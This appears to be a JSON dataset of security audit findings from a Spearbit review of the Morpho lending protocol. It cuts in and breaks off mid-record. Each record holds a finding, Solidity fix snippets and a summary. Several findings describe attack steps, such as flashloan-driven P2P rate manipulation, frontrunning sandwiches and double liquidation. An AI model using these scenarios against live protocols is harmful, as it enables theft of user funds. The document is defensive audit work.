      "summary": "\nThis bug report is about an issue with the MarketsManagerForAave.sol#L448, which is part of the protocol used by Aave. This protocol has a queue for users to be connected to P2P credit lines, but if the queue is not fully processed in one single transaction, a \"delta\" is introduced which leads to a worse rate for existing P2P users. An attacker can force a delta to be introduced which leads to worse rates, as the algorithm performs a \"hard withdraw\" as the last step if it reaches the max iteration limit, creating a borrower delta. \n\nThe recommendation is to consider mitigations for single-transaction flash supply & withdraw attacks. Morpho suggested to refactor the entire queue system at some point, which Spearbit acknowledged.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6937",
      "title": "Initial SwapManager cumulative prices values are wrong",
      "impact": "MEDIUM",
      "content": "## Medium Risk Severity Report\n\n## Context\n- **File:** SwapManagerUniV2.sol\n- **Lines:** 65-66\n\n## Description\nThe initial cumulative price values are integer divisions of unscaled reserves and not UQ112x112 fixed-point values.\n\n```solidity\n(reserve0, reserve1, blockTimestampLast) = pair.getReserves();\nprice0CumulativeLast = reserve1 / reserve0;\nprice1CumulativeLast = reserve0 / reserve1;\n```\n\nOne of these values will (almost) always be zero due to integer division. Then, when the difference is taken to the real `currentCumulativePrices` in `update`, the TWAP will be a large, wrong value. The slippage checks will not work correctly.\n\n## Recommendation\nConsider using the same code as the UniswapV2 example oracle.\n\n## Morpho\nFixed in PR #550.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about a medium risk issue found in the SwapManagerUniV2.sol code. The issue is that the initial cumulative price values are being calculated as integer divisions of unscaled reserves and not UQ112x112 fixed-point values. This means that one of the values will almost always be zero and when the difference is taken to the real currentCumulativePrices inupdate, the TWAP (time-weighted average price) will be a large, wrong value. As a result, the slippage checks will not work correctly.\n\nThe recommended solution is to use the same code as the UniswapV2 example oracle. This was acknowledged by Spearbit and fixed in PR #550 by Morpho.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Precision Loss"
      ],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6936",
      "title": "NDS min/max value should be properly validated to avoid tx to always fail/skip loop",
      "impact": "MEDIUM",
      "content": "## Security Report\n\n## Severity\n**Medium Risk**\n\n## Context\n`PositionsManagerForAaveGettersSetters.sol#L40-L43`\n\n## Description\n`PositionsManagerForAaveLogic` is currently initialized with a default value of `NDS = 20`. The `NDS` value is used by `MatchingEngineForAave` when it needs to call `DoubleLinkedList.insertSorted` in both `updateBorrowers` and `updateSuppliers`. \n\n`updateBorrowers` and `updateSuppliers` are called by:\n- `MatchingEngineForAave.matchBorrowers`\n- `MatchingEngineForAave.unmatchBorrowers`\n- `MatchingEngineForAave.matchSuppliers`\n- `MatchingEngineForAave.unmatchSuppliers`\n\nThese functions, along with the directly invoked `updateBorrowers` and `updateSuppliers`, are also called by `PositionsManagerForAaveLogic`.\n\n## Problems\n- A low `NDS` value would make the loop inside `insertSorted` exit early, increasing the probability of a supplier/borrower being added to the tail of the list. This is something that Morpho aims to avoid as it would decrease protocol performance during supplier/borrower match/unmatch operations.\n- In cases where a list is long enough, a very high value could cause the transaction to revert every time one of those functions directly or indirectly calls `insertSorted`. The gas \"rail guard\" present in the match/unmatch supplier/borrower processes becomes ineffective because the loop would be executed at least once.\n\n## Recommendation\nConduct sufficient tests to determine a safe minimum and maximum value for `NDS` that protects against denial-of-service (DOS) while still ensuring the protocol performs as expected.\n\n## Morpho\nFix has been implemented.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report concerns the PositionsManagerForAaveGettersSetters.sol#L40-L43, which is currently initialized with a default value of NDS = 20. This value is used by the MatchingEngineForAave when it needs to call DoubleLinkedList.insertSorted in both updateBorrowers and updateSuppliers. \n\nThe problems with this default value are two-fold: a low NDS value would make the loop inside insertSorted exit early, increasing the probability of a supplier/borrower to be added to the tail of the list, and a very high value would make the transaction revert each time one of the functions directly or indirectly call insertSorted. \n\nThe recommendation is to make enough tests to determine a safe min/max value for NDS that protect from DOS but still make the protocol perform as expected. Morpho has implemented the fix, and Spearbit has acknowledged it.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation"
      ],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6935",
      "title": "Low/high MaxGas values could make match/unmatch supplier/borrower functions always fail or revert",
      "impact": "MEDIUM",
      "content": "## Vulnerability Report\n\n## Severity\n**Medium Risk**\n\n## Context\n- PositionsManagerForAaveGettersSetters.sol#L47-L50\n- PositionsManagerForAaveLogic.sol#L34\n\n## Description\nThe `maxGas` variable is used to determine how much gas the `matchSuppliers`, `unmatchSuppliers`, `matchBorrowers`, and `unmatchBorrowers` functions can consume while trying to match/unmatch suppliers/borrowers and also updating their position if matched.\n\n- `maxGas = 0` will make the process skip the loop entirely.\n- A low `maxGas` will make the loop run at least one time, but the smaller the `maxGas`, the higher the possibility that not all available suppliers/borrowers are matched/unmatched.\n- A very high `maxGas` could cause the loop to consume all the block gas, leading to a transaction revert.\n\n*Note:* `maxGas` can be overridden by the user when calling the `supply` or `borrow` functions.\n\n## Recommendation\nConduct thorough testing to determine a safe minimum and maximum value for `maxGas`.\n\n## Morpho\nThese parameters will be decided by governance in the future. We will implement a time-lock of seven days to ensure everyone can review the relevance of these parameters. Additionally, the governance has no incentives to implement incorrect parameters that could harm Morpho and its users.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about the variable maxGas used in the contracts PositionsManagerForAaveGettersSetters.sol and PositionsManagerForAaveLogic.sol. The variable maxGas is used to determine how much gas the matchSuppliers, unmatchSuppliers, matchBorrowers, and unmatchBorrowers functions can consume while trying to match/unmatch supplier/borrower and also updating their position if matched. If maxGas is set to 0, the loop will be skipped entirely, and if maxGas is set too low, the loop may not be able to match/unmatch all available suppliers/borrowers and may consume all the block gas, causing the transaction to revert. It is recommended that enough tests be done to determine a safe minimum/maximum value for maxGas. Morpho has suggested that the parameters will be decided by governance in the future, with a time-lock of seven days to ensure everyone can check the relevance of these parameters, and that the governance has no incentives to implement wrong parameters that could harm Morpho and its users. Spearbit has acknowledged this.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation",
        "Gas Limit"
      ],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6934",
      "title": "Setting a new rewards manager breaks claiming old rewards",
      "impact": "MEDIUM",
      "content": "## Security Issue Report\n\n## Severity\n**Medium Risk**\n\n## Context\n`PositionsManagerForAaveGettersSetters.sol#L62`\n\n## Description\nSetting a new rewards manager will break any old unclaimed rewards as users can only claim through the `PositionManager.claimRewards` function which then uses the new reward manager.\n\n## Recommendation\nBe cautious when setting new reward managers and ideally ensure there arent any unclaimed user rewards.\n\n## Morpho\nPerhaps make this setter settable only once? And have another setter indicating whether or not we should accrue rewards of users so that in the `MatchingEngine` we do not call the rewards manager if we already know there is no more liquidity mining.\n\n## Spearbit\nThat is one way to solve it if you dont need the migration behavior.\n\n## Morpho\nWe decided to keep it as it is for now. Will warn users if we plan to change the rewards manager. At the end, well need different reward managers.\n\n## Spearbit\nAcknowledged, changes have not been made.",
      "summary": "\nThis bug report is about the PositionsManagerForAaveGettersSetters.sol file on line 62. The issue is that if a new rewards manager is set, any old unclaimed rewards will be lost as users can only claim them through the PositionManager.claimRewards function, which is then using the new reward manager. It is recommended to be cautious when setting new reward managers, and ideally to ensure that there are no unclaimed user rewards. One possible solution is to make the setter settable only once and to have another setter saying whether or not rewards should be accrued, so that in the MatchingEngine, the rewards manager is not called if there is no more liquidity mining. After discussing, it was decided to keep it as it is for now, and to warn users if the rewards manager is planned to be changed. In the end, different reward managers will be needed. No changes have been made yet.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6933",
      "title": "Missing input validation checks on contract initialize/constructor",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- MarketsManagerForAave.sol#L125-L130\n- PositionsManagerForAaveLogic.sol#L24-L42\n- RewardsManagerForAave.sol#L63-L66\n- SwapManagerUniV2.sol#L54-L70\n- SwapManagerUniV3.sol#L58-L85\n- SwapManagerUniV3OnEth.sol#L65-L87\n\n## Description\nContract initialize/constructor input parameters should always be validated to prevent the creation/initialization of a contract in a wrong/inconsistent state.\n\n## Recommendation\nConsider implementing the following changes.\n\n### MarketsManagerForAave.sol\n```solidity\nfunction initialize(ILendingPool _lendingPool) external initializer {\n    + require(address(_lendingPool) != address(0), \"input != address(0)\");\n    __UUPSUpgradeable_init();\n    __Ownable_init();\n    lendingPool = ILendingPool(_lendingPool);\n}\n```\n\n### PositionsManagerForAaveLogic.sol\n**Important note:** _maxGas and NDS values should also be validated considering the following separated issues:\n- Low/high MaxGas values could make match/unmatch supplier/borrower functions always fail or revert #34\n- NDS min/max value should be properly validated to avoid tx to always fail/skip loop #33\n\n```solidity\nfunction initialize(\n    IMarketsManagerForAave _marketsManager,\n    ILendingPoolAddressesProvider _lendingPoolAddressesProvider,\n    ISwapManager _swapManager,\n    MaxGas memory _maxGas\n) external initializer {\n    + require(address(_marketsManager) != address(0), \"_marketsManager != address(0)\");\n    + require(address(_lendingPoolAddressesProvider) != address(0), \"_lendingPoolAddressesProvider != address(0)\");\n    + require(address(_swapManager) != address(0), \"_swapManager != address(0)\");\n    __UUPSUpgradeable_init();\n    __ReentrancyGuard_init();\n    __Ownable_init();\n    maxGas = _maxGas;\n    marketsManager = _marketsManager;\n    addressesProvider = _lendingPoolAddressesProvider;\n    lendingPool = ILendingPool(addressesProvider.getLendingPool());\n    matchingEngine = new MatchingEngineForAave();\n    swapManager = _swapManager;\n    NDS = 20;\n}\n```\n\n### RewardsManagerForAave.sol\n```solidity\nconstructor(ILendingPool _lendingPool, IPositionsManagerForAave _positionsManager) {\n    + require(address(_lendingPool) != address(0), \"_lendingPool != address(0)\");\n    + require(address(_positionsManager) != address(0), \"_positionsManager != address(0)\");\n    lendingPool = _lendingPool;\n    positionsManager = _positionsManager;\n}\n```\n\n### SwapManagerUniV2.sol\n```solidity\nconstructor(address _morphoToken, address _rewardToken) {\n    + require(_morphoToken != address(0), \"_morphoToken != address(0)\");\n    + require(_rewardToken != address(0), \"_rewardToken != address(0)\");\n    MORPHO = _morphoToken;\n    REWARD_TOKEN = _rewardToken;\n    /// ...\n}\n```\n\n### SwapManagerUniV3.sol\n**Worth noting:**\n- _morphoPoolFee should have a max value check\n- _rewardPoolFee should have a max value check\n\n```solidity\nconstructor(\n    address _morphoToken,\n    uint24 _morphoPoolFee,\n    address _rewardToken,\n    uint24 _rewardPoolFee\n) {\n    + require(_morphoToken != address(0), \"_morphoToken != address(0)\");\n    + require(_rewardToken != address(0), \"_rewardToken != address(0)\");\n    MORPHO = _morphoToken;\n    MORPHO_POOL_FEE = _morphoPoolFee;\n    REWARD_TOKEN = _rewardToken;\n    REWARD_POOL_FEE = _rewardPoolFee;\n    /// ...\n}\n```\n\n### SwapManagerUniV3OnEth.sol\n**Worth noting:**\n- _morphoPoolFee should have a max value check\n\n```solidity\nconstructor(address _morphoToken, uint24 _morphoPoolFee) {\n    + require(_morphoToken != address(0), \"_morphoToken != address(0)\");\n    MORPHO = _morphoToken;\n    MORPHO_POOL_FEE = _morphoPoolFee;\n    /// ...\n}\n```\n\n## Morpho\nThis is more our responsibility to set our contracts properly at deployment, so we dont think this is much relevant to add these require knowing that the PositionsManager is already a large contract.  \nHowever, we agree that the two following issues are relevant:\n- Low/high MaxGas values could make match/unmatch supplier/borrower functions always fail or revert #34\n- NDS min/max value should be properly validated to avoid tx to always fail/skip loop #33\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about ensuring the input parameters of contracts are properly validated to prevent the creation/initialization of a contract in a wrong/inconsistent state. The report outlines the contracts that need to be changed and the changes that need to be implemented. \n\nThe MarketsManagerForAave.sol should add a require statement to validate the input parameter of the initialize function. The PositionsManagerForAaveLogic.sol should validate the _maxGas and NDS values to avoid the match/unmatch supplier/borrower functions always failing or reverting. The RewardsManagerForAave.sol should also validate the input parameters of the constructor. In the SwapManagerUniV2.sol, the constructor should validate the _morphoToken and _rewardToken parameters. The SwapManagerUniV3.sol should validate the _morphoPoolFee and _rewardPoolFee parameters and the SwapManagerUniV3OnEth.sol should validate the _morphoPoolFee parameter. \n\nMorpho agrees that the two issues of validating the MaxGas values and the NDS min/max value are relevant and should be addressed. Spearbit acknowledges the report.",
      "quality_score": 4.5,
      "rarity_score": 2.5,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation"
      ],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6932",
      "title": "rewardsManager used in MatchingEngineForAave could be not initialized",
      "impact": "MEDIUM",
      "content": "## Medium Risk Vulnerability Report\n\n## Severity\n**Medium Risk**\n\n## Context\n- `MatchingEngineForAave.sol#L380-L385`\n- `MatchingEngineForAave.sol#L410-L415`\n\n## Description\nThe `MatchingEngineForAave` updates the `userUnclaimedRewards` for a supplier/borrower each time it gets updated. However, the `rewardsManager` is not initialized in `PositionsManagerForAaveLogic.initialize`, but only via `PositionsManagerForAaveGettersSetters.setRewardsManager`. This means that it will start as `address(0)`. Each time a supplier or borrower gets updated and the `rewardsManager` address is empty, the transaction will revert.\n\nTo replicate the issue, comment out the following line in `TestSetup`:\n\n```\npositionsManager.setRewardsManager(address(rewardsManager));\n```\n\nThen run `make c-TestSupply`. All tests will fail with the following error:\n\n```\n[FAIL. Reason: Address: low-level delegate call failed]\n```\n\n## Recommendation\nEnsure that `PositionsManagerForAaveGettersSetters.setRewardsManager` is called after deploying and initializing `PositionsManagerForAaveLogic`, or pass it directly in `PositionsManagerForAaveLogic.initialize` as a new parameter.\n\n## Additional Notes\n- **Morpho**: A check on `address(rewardsManager) != address(0)` has been implemented in PR #554.\n- **Spearbit**: Acknowledged.",
      "summary": "\nA bug was discovered in the MatchingEngineForAave.sol code, which affects the userUnclaimedRewards for suppliers and borrowers. The rewardsManager was not initialized in PositionsManagerForAaveLogic.initialize, meaning it started as address(0). When a supplier or borrower was updated and the rewardsManager address was empty, the transaction would revert. \n\nTo replicate the issue, the user should comment out positionsManager.setRewardsManager(address(rewardsManager)) in TestSetup and run make c-TestSupply. This will cause all tests to fail with [FAIL. Reason: Address: low-level delegate call failed].\n\nTo fix the issue, the user should make sure to always call PositionsManagerForAaveGettersSetters.setRewardsManager after deploying and initializing PositionsManagerForAaveLogic, or pass it directly in PositionsManagerForAaveLogic.initialize as a new parameter. A check on address(rewardsManager) != address(0) has been implemented in PR #554, and the issue has been acknowledged.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6931",
      "title": "PositionsManagerForAave claimToTreasury could allow sending underlying to 0x address",
      "impact": "MEDIUM",
      "content": "## Vulnerability Report\n\n## Severity\n**Medium Risk**\n\n## Context\nPositionsManagerForAave.sol#L223-L232\n\n## Description\nThe `claimToTreasury` function is currently not verifying if the `treasuryVault` address is not equal to `address(0)`. In the current state, it would allow the owner of the contract to burn the underlying token instead of sending it to the intended treasury address.\n\n## Recommendation\nAdd a check to prevent sending treasury underlying tokens to `address(0)` and verify that the `amountToClaim` is not equal to `0` to prevent wasting gas and emitting a false event.\n\n```solidity\nfunction claimToTreasury(address _poolTokenAddress)\nexternal\nonlyOwner\nisMarketCreatedAndNotPaused(_poolTokenAddress)\n{\n    require(treasuryVault != address(0), \"treasuryVault != address(0)\");\n    ERC20 underlyingToken = ERC20(IAToken(_poolTokenAddress).UNDERLYING_ASSET_ADDRESS());\n    uint256 amountToClaim = underlyingToken.balanceOf(address(this));\n    require(amountToClaim != 0, \"amountToClaim != 0\");\n    underlyingToken.safeTransfer(treasuryVault, amountToClaim);\n    emit ReserveFeeClaimed(_poolTokenAddress, amountToClaim);\n}\n```\n\n## References\n- **Morpho**: Fixed in PR #562.\n- **Spearbit**: Acknowledged.",
      "summary": "\nThis bug report is about the PositionsManagerForAave smart contract. It states that currently, the claimToTreasury function is not verifying if the treasuryVault address is not equal to address(0). This means that the owner of the contract can burn the underlying token instead of sending it to the intended treasury address. \n\nThe recommendation is to add a check to prevent sending treasury underlying tokens to address(0) and verify that the amountToClaim is not equal to 0. This is to prevent wasting gas and emitting a \"false\" event. \n\nMorpho has fixed this bug in PR #562 and Spearbit has acknowledged this.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation"
      ],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6930",
      "title": "TWAP intervals should be flexible as per market conditions",
      "impact": "MEDIUM",
      "content": "## Security Report\n\n## Severity\n**Medium Risk**\n\n## Context\n`SwapManagerUniV3.sol#L140-L149`\n\n## Description\nThe protocol is using the same `TWAP_INTERVAL` for both `weth-morpho` and `weth-reward` token pools while their liquidity and activity might be different. It should use separate appropriate values for both pools.\n\n## Recommendation\nThe `TWAP_INTERVAL` value should be changeable (and not constant) by the admin/owner since it is dependent upon market conditions and activity (for example, a 1-hour TWAP might lag considerably in sudden movements).\n\n## Responses\n- **Morpho:** Valid issue, will fix.\n- **Spearbit:** Recommendation has been followed in the PR #557.",
      "summary": "\nA bug report has been filed regarding the SwapManagerUniV3.sol. The protocol is currently using the same TWAP_INTERVAL for both the weth-morpho and weth-reward token pools, even though their liquidity and activity may be different. This poses a medium risk to the protocol. It is recommended that the TWAP_INTERVAL value should be changeable by the admin/owner, as it is dependent upon market conditions and activity. This recommendation has been followed in the PR #557.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Hardcoded Setting"
      ],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6929",
      "title": "Frontrunners can exploit the system by not allowing head of DLL to match in P2P",
      "impact": "MEDIUM",
      "content": "## Vulnerability Report\n\n## Severity\n**Medium Risk**\n\n## Context\n**MatchingEngineForAave.sol**\n\n## Description\nFor a given asset X, liquidity is supplied on the pool since there are not enough borrowers. \n\n- **suppliersOnPool head:** `0xawith` 1000 units of x.  \nWhenever there is a new transaction in the mempool to borrow 100 units of x:\n- Frontrunner supplies 1001 units of x and is supplied on pool.\n- **updateSuppliers** will place the frontrunner on the head (assuming very high gas is supplied).\n- Borrowers transaction lands and is matched 100 units of x with a frontrunner in p2p.\n- Frontrunner withdraws the remaining 901 left which was on the underlying pool.\n\n### Favorable conditions for an attack:\n- Relatively fewer gas fees & relatively high block gas limit.\n- **insertSorted** is able to traverse to head within block gas limit (i.e., length of DLL).\n  \nSince this is a non-atomic sandwich, the frontrunner needs excessive capital for a blocks time period.\n\n## Recommendation\nConsider sandwich attack mitigations.\n\n## Additional Notes\n**Morpho:** We acknowledge this issue and we are currently searching for better matching engine mechanisms. Though, as we must prevent the protocol from DDoS attacks, a classic FIFO is not possible. Well keep the matching engine as is since the result of the front-running attack you mentioned is similar to a whale with huge capital which would be at the head of the list.\n\n**Spearbit:** Acknowledged, matching engine remains unchanged.",
      "summary": "\nThis bug report is about a potential attack on the MatchingEngineForAave.sol. The attack is possible when a borrower transaction is matched with a frontrunner in p2p. The frontrunner would then withdraw the remaining units left on the underlying pool. This attack is possible when the gas fees are relatively lower and the block gas limit is relatively higher. \n\nThe recommendation given to prevent this attack is to consider sandwich attack mitigations. Morpho acknowledges the issue and is currently looking for better matching engine mechanisms. However, they must prevent the protocol from DDOs attacks and hence a classic FIFO is not possible. Spearbit also acknowledges the issue, but the matching engine remains unchanged.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6928",
      "title": "Liquidating Morphos Aave position leads to state desynchronization",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n\n## Context\nPositionsManagerForAaveGettersSetters.sol#L208-L219\n\n## Description\nMorpho has a single position on Aave that encompasses all of Morphos individual user positions that are on the pool. When this Aave Morpho position is liquidated, the user position state tracked in Morpho desynchronizes from the actual Aave position. This leads to issues when users try to withdraw their collateral or repay their debt from Morpho. Its also possible to double-liquidate for a profit.\n\n### Example\nTheres a single borrower B1 on Morpho who is connected to the Aave pool.\n- B1 supplies 1 ETH and borrows 2500 DAI. This creates a position on Aave for Morpho.\n- The ETH price crashes and the position becomes liquidatable.\n- A liquidator liquidates the position on Aave, earning the liquidation bonus. They repaid some debt and seized some collateral for profit.\n- This repaid debt / removed collateral is not synced with Morpho. The users supply and debt balance remain 1 ETH and 2500 DAI. The same user on Morpho can be liquidated again because Morpho uses the exact same liquidation parameters as Aave.\n- The Morpho liquidation call again repays debt on the Aave position and withdraws collateral with a second liquidation bonus.\n- The state remains desynced.\n\n## Recommendation\nLiquidating the Morpho position should not break core functionality for Morpho users. Morpho: This issue can be prevented by sending, at the beginning at least, aTokens on behalf of Morpho and set it as collateral to prevent this issue. Also, we will run our own liquidation bots. We will not implement any \"direct\" fix inside the code.\n\n## Spearbit\nAcknowledged, no direct fixes have been implemented.",
      "summary": "\nThis bug report concerns an issue with the PositionsManagerForAaveGettersSetters.sol code in Morpho. When a single position on Aave that encompasses all of Morphos individual user positions is liquidated, the user position state tracked in Morpho desynchronizes from the actual Aave position. This leads to issues when users try to withdraw their collateral or repay their debt from Morpho, and it's also possible to double-liquidate for a profit.\n\nTo illustrate this, consider a single borrower B1 on Morpho who supplies 1 ETH and borrows 2500 DAI. This creates a position on Aave for Morpho. If the ETH price crashes and the position becomes liquidatable, a liquidator can liquidate the position on Aave, earning the liquidation bonus. They can repay some debt and seize some collateral for profit. However, this repaid debt and removed collateral is not synced with Morpho; the users supply and debt balance remain 1 ETH and 2500 DAI. This means the same user on Morpho can be liquidated again because Morpho uses the exact same liquidation parameters as Aave.\n\nThe recommendation to prevent this issue is to send aTokens on behalf of Morpho and set it as collateral, and to run their own liquidation bots. No direct fixes have been implemented. This issue is of high risk and should be addressed as soon as possible.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6927",
      "title": "P2P rate can be manipulated as its a lazy-updated snapshot",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n## Context\nMarketsManagerForAave.sol#L408-L411\n\n## Description\nThe P2P rate is lazy-updated upon interactions with the Morpho protocol. It takes the mid-rate of the current Aave supply and borrow rate. Its possible to manipulate these rates before triggering an update on Morpho.\n```solidity\nfunction _updateSPYs(address _marketAddress) internal {\n    DataTypes.ReserveData memory reserveData = lendingPool.getReserveData(\n        IAToken(_marketAddress).UNDERLYING_ASSET_ADDRESS()\n    );\n    uint256 meanSPY = Math.average(\n        reserveData.currentLiquidityRate,\n        reserveData.currentVariableBorrowRate\n    ) / SECONDS_PER_YEAR; // In ray\n}\n```\n\n## Example\nAssume an attacker has a P2P supply position on Morpho and wants to earn a very high APY on it. He does the following actions in a single transaction:\n- Borrow all funds on the desired Aave market. (This can be done by borrowing against flashloaned collateral).\n- The utilisation rate of the market is now 100%. The borrow rate is the max borrow rate, and the supply rate is `(1.0 - reserveFactor) * maxBorrowRate`. The max borrow rate can be higher than 100% APY, see Aave docs.\n- The attacker triggers an update to the P2P rate, for example, by supplying 1 token to the pool `Positions-ManagerForAave.supply(poolTokenAddress, 1, ...)`, triggering `marketsManager.updateSPYs(_poolTokenAddress)`.\n- The new mid-rate is computed, which will be `(2.0 - reserveFactor) * maxBorrowRate / 2 ~ maxBorrowRate`.\n- The attacker repays their Aave debt in the same transaction, not paying any interest on it.\n- All P2P borrowers now pay the max borrow rate to the P2P suppliers until the next time a user interacts with the market on Morpho.\n- This process can be repeated to keep the APY high.\n\n## Recommendation\nConsider using a time-weighted mid-rate instead of trusting the current value. Create an oracle contract that is triggered by the protocol administrators to compute the running TWAR (Time-Weighted-Average-Rate) of Aave. \n\nAlso, ensure that the P2P rate used by the protocol is updated often (`updateSPYs`) to not diverge from the Aave pool rate. This can be detrimental in low-activity markets where a high APY is locked in and no P2P update rate is triggered for a long time period.\n\n## Discussion\n**Morpho:** How can this kind of attack be profitable if there is a bot that updates rates after such tx? I mean, it can only be a griefing attack, right? In the case the user has enough capital to harm Morpho, the user only needs to pay the gas of tx, nothing else, so it would end up in the same situation, no? The drawback of a TWAP would be to unsynch Morpho from the real P2P, which can lead to other major issues.\n\n**Spearbit:** You cant assume that there isnt such a bot, and even if there is, you cant assume that the sync always perfectly ends up in the same block as the attack transaction. Because even if the syncing ends up in the next block, youd still pay high interest for 1 block. This attack only costs gas fees; they can take 0%-fee flashloans (flashmint DAI, turn it to aDAI supply) and then borrow against it. The borrow also doesnt come with any interest because its repaid in the same block. \n\nIts a griefing attack if the attacker does not have their own supply position on Morpho, but as soon as they have a supply position, its very likely to be profitable because they only pay gas fees but earn high APR. \n\nMorphos P2P rate is already different from the real Aave mid-rate because it isnt updated every block to reflect changes in Aaves mid-rate. (Thats what I mean by lazy-updated snapshot and \"Also, ensure that the P2P rate the protocol uses is updated often (`updateSPYs`) to not diverge from the Aave pool rate.\") \n\nIt doesnt actually have to be time-weighted; it could just be an oracle that also stores the current Aave mid-rate, but these updates couldnt be manipulated by an attacker as they can only be triggered by admins.\n\n**Morpho:** We are working on a completely new way to manage exchange rates. The idea is to delete Morphos midrate and update our exchange rates with a formula that only depends on the pools exchange rates (and not the rate, to avoid manipulations).\n\nAssociated fix in #PR 601.\n\n**Spearbit:** Acknowledged.",
      "summary": "\nA high-risk bug has been identified in the MarketsManagerForAave.sol code, which allows an attacker to manipulate the P2P rate when interacting with the Morpho protocol. This bug occurs when the attacker borrows all funds from a desired Aave market and triggers an update to the P2P rate by supplying 1 token to the pool. This causes the mid-rate to be calculated as (2.0 - reserveFactor) * maxBorrowRate / 2 ~ maxBorrowRate, which is higher than the APY of the Aave market. The attacker can then repay their Aave debt in the same transaction, earning a high APY.\n\nTo prevent this attack, Morpho is considering using a time-weighted mid-rate instead of trusting the current value, or creating an oracle contract that is triggered by protocol administrators to compute the running TWAR of Aave. Additionally, they suggest ensuring that the P2P rate is updated often to not diverge from the Aave pool rate. Morpho is also working on a new way to manage exchange rates, which will update the exchange rates with a formula that only depends on the pools exchange rates, thus avoiding manipulation.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "TWAP"
      ],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6926",
      "title": "SwapManager fails at updating TWAP",
      "impact": "HIGH",
